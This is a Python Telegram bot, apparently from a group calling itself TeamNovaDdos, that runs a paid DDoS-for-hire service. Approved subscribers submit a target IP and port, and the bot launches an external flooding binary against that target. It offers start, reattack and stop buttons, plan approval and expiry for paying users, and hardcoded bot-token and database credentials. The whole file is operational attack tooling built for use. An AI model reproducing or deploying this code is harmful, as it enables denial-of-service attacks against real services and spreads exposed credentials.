import telebot
import logging
import subprocess
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import time
import asyncio
import json 
import os
import requests
import signal

# Set constants and configure logging
REQUEST_INTERVAL = 1
TOKEN = '6495895757:AAHVL6tjwQTUpBPKqY7kGIGK-Ul01k958NM'
MONGO_URI = 'mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb'
CHANNEL_ID = -1002200678079
ADMIN_IDS = [2067727121]
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['@teamnovaddos']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)

# Asyncio to fix auto-disconnect
loop = asyncio.get_event_loop()

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Attack management using subprocess and process IDs
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
previous_attack_details = {}
active_attacks = {}

# Function to run C code to start/stop the attack
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        # Start the attack as a new process and store the PID
        process = subprocess.Popen(
            ["./4stop", target_ip, str(target_port), "70", "1"],  # Updated to run with threads and start action
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        # Store the process PID to terminate later
        active_attacks[(target_ip, target_port)] = process.pid
        logging.info(f"Started attack on {target_ip}:{target_port} (PID: {process.pid})")
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the individual process by its PID
                os.kill(pid, signal.SIGTERM)
                logging.info(f"Attack stopped for {target_ip}:{target_port} (PID: {pid})")
            except ProcessLookupError:
                logging.error(f"Process {pid} does not exist, cannot stop attack on {target_ip}:{target_port}")
            except Exception as e:
                logging.error(f"Failed to stop attack on {target_ip}:{target_port}: {e}")
        else:
            logging.error(f"No active attack found for {target_ip}:{target_port}")

def is_user_admin(user_id, chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0 and (user_data.get('valid_until') == "" or datetime.now().date() <= datetime.fromisoformat(user_data['valid_until']).date()):
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED\n\nBy @TeamNovaDdos*", parse_mode='Markdown')

def send_main_buttons(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn_attack = KeyboardButton("ENTER IP PORT ☠️")
    btn_start = KeyboardButton("Start Attack 🚀")
    btn_reattack = KeyboardButton("Reattack 😈")
    btn_stop = KeyboardButton("Stop Attack 🤐")
    markup.add(btn_attack, btn_start, btn_reattack, btn_stop)

    bot.send_message(message.chat.id, "*Choose an action:\n\nBy @TeamNovaDdos*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message)

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command\n\nPlease contact @Anik_x_pro *", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])
        
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        bot.send_message(chat_id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approving user: {e}")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(chat_id, "*Invalid command format. Use /disapprove <user_id>.*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])

        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        bot.send_message(chat_id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in disapproving user: {e}")


@bot.message_handler(func=lambda message: message.text == "ENTER IP PORT ☠️")
def attack_button(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    bot.send_message(chat_id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid command format. Please provide target_ip and target_port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message)
    except Exception as e:
        logging.error(f"Error in processing attack IP and port: {e}")

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        target_ip, target_port = attack_details
        if target_ip and target_port:
            if (target_ip, target_port) in active_attacks:
                bot.send_message(chat_id, "*Previous attack is still running. Stopping previous attack...*", parse_mode='Markdown')
                run_attack_command_sync(target_ip, target_port, 2)
            run_attack_command_sync(target_ip, target_port, 1)
            bot.send_message(chat_id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\n\nBy @TeamNovaDdos*", parse_mode='Markdown')
            previous_attack_details[user_id] = (target_ip, target_port)
        else:
            bot.send_message(chat_id, "*Invalid IP or port. Please use /Attack to set them up.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*No IP and port set. Please use /Attack to set them up.*", parse_mode='Markdown')



@bot.message_handler(func=lambda message: message.text == "Reattack 😈")
def reattack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    previous_details = previous_attack_details.get(user_id)
    if previous_details:
        target_ip, target_port = previous_details
        if (target_ip, target_port) in active_attacks:
            bot.send_message(chat_id, "*Previous attack is still running. Stopping previous attack...*", parse_mode='Markdown')
            run_attack_command_sync(target_ip, target_port, 2)
        user_attack_details[user_id] = (target_ip, target_port)
        bot.send_message(chat_id, f"*Reattack started 💥\n\nHost: {target_ip}\nPort: {target_port}\n\nBy @TeamNovaDdos*", parse_mode='Markdown')
        run_attack_command_sync(target_ip, target_port, 1)
    else:
        bot.send_message(chat_id, "*No previous attack details found.*", parse_mode='Markdown')

        
@bot.message_handler(func=lambda message: message.text == "Stop Attack 🤐")
def stop_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        target_ip, target_port = attack_details
        if target_ip and target_port:
            run_attack_command_sync(target_ip, target_port, 2)
            bot.send_message(chat_id, f"*Attack stopped for Host: {target_ip} and Port: {target_port}\n\nBy @TeamNovaDdos*", parse_mode='Markdown')
            user_attack_details.pop(user_id, None)
        else:
            bot.send_message(chat_id, "*IP and port are not set properly. Cannot stop attack.\n\nBy @TeamNovaDdos*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*No active attack found to stop.\n\nBy @TeamNovaDdos*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
